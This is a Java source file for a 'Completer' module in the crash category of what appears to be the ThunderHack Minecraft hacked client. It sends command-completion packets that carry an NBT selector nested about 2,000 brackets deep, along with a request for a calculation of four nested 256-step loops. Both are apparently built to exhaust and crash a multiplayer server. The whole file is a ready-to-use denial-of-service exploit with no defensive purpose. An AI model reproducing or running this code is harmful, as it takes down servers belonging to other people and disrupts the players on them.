package thunder.hack.features.modules.crash;

import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
import thunder.hack.features.modules.Module;

import java.util.stream.Collectors;
import java.util.stream.IntStream;

public class Completer extends Module {
    private static final String[] COMMANDS = {
            "msg", "minecraft:msg", "tell", "minecraft:tell",
            "tm", "teammsg", "minecraft:teammsg", "w", "me"
    };
    private int index = 0;
    private boolean sent = false;

    public Completer() {
        super("Completer", Category.CRASH);
    }

    @Override
    public void onEnable() {
        sent = false;
    }

    @Override
    public void onUpdate() {
        if (mc.player == null || mc.getNetworkHandler() == null || sent) return;

        if (index >= COMMANDS.length) index = 0;

        String base = COMMANDS[index] + " @a[nbt={PAYLOAD}]";
        int len = Math.max(2044 - base.length(), 100);
        String payload = "{a:" + IntStream.range(0, len).mapToObj(i -> "[").collect(Collectors.joining()) + "}";
        String full = "/" + base.replace("{PAYLOAD}", payload);

        for (int i = 0; i < 3; i++) {
            mc.getNetworkHandler().sendPacket(new RequestCommandCompletionsC2SPacket(i, full));
            String math = "/to for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}";
            mc.getNetworkHandler().sendPacket(new RequestCommandCompletionsC2SPacket(i + 100, math));
        }

        sendMessage("Packet sent");
        index++;
        sent = true;
        disable();
    }

    @Override
    public void onDisable() {
        sent = false;
    }
}
